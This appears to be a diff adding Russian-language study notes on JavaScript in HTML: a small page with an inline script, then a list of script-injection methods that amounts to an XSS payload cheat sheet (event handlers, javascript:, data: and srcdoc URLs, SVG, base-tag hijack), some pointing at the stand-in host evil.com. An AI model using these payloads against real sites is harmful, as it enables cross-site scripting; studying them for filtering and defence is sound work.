@@ -1328,3 +1328,101 @@ class BankAccount {
     }
 }
 ```
+
+
+js внутри html  через `<script>`
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Пример</title>
+</head>
+<body>
+    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quaerat, id?</p>
+    <input type="text" id="input" placeholder="Введите что-то">
+    <button id="button">Готово</button>
+    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Voluptatem, libero, blanditiis! Quasi eos, cupiditate expedita velit nulla nesciunt optio consequuntur, perspiciatis iste ipsa porro cum voluptate possimus similique sapiente laborum.</p>
+
+    <script>
+        let button = document.getElementById("button");
+        button.onclick = function() {
+            document.getElementById("input").style.display = "none";
+        };
+    </script>
+</body>
+</html>
+```
+
+все способы как внедряется js в разметку HTML
+```html
+
+---- базовые способы ------
+
+<!-- 1. Внутренний скрипт (inline) -->
+<script>
+    alert(1);
+</script>
+
+<!-- 2. Внешний скрипт -->
+<script src="https://evil.com/xss.js"></script>
+
+<!-- 3. Инлайн-события (HTML-атрибуты) -->
+<button onclick="alert(1)">Click</button>
+<img src="x" onerror="alert(1)">
+<div onmouseover="alert(1)">Hover</div>
+<body onload="alert(1)">
+<input onfocus="alert(1)" autofocus>
+
+<!-- 4. JavaScript: URL -->
+<a href="javascript:alert(1)">Click me</a>
+<iframe src="javascript:alert(1)"></iframe>
+<form action="javascript:alert(1)">
+
+------ продвинутые "" ----
+
+<!-- 5. data: URL -->
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<embed src="data:text/html,<script>alert(1)</script>">
+
+<!-- 6. blob: URL -->
+<script src="blob:https://example.com/1234-5678-90ab-cdef"></script>
+
+<!-- 7. about: URL (не везде) -->
+<iframe src="about:blank" onload="alert(1)"></iframe>
+<iframe src="about:srcdoc"></iframe>
+
+<!-- 8. srcdoc (HTML5) -->
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+----- через теги --------
+
+<!-- 9. CSS-выражения (только старый IE) -->
+<div style="width: expression(alert(1))"></div>
+<style>div { width: expression(alert(1)); }</style>
+
+<!-- 10. SVG -->
+<svg onload="alert(1)"></svg>
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use>
+
+<!-- 11. Meta-теги (старые браузеры) -->
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+
+<!-- 12. Link (очень редко) -->
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+
+<!-- 13. Object/Embed с HTML -->
+<object type="text/html" data="javascript:alert(1)"></object>
+<embed type="text/html" src="javascript:alert(1)">
+
+<!-- 14. Base-тег (меняет пути) -->
+<base href="https://evil.com/">
+<script src="script.js"></script>  <!-- загрузится с evil.com -->
+
+
+
+```
+
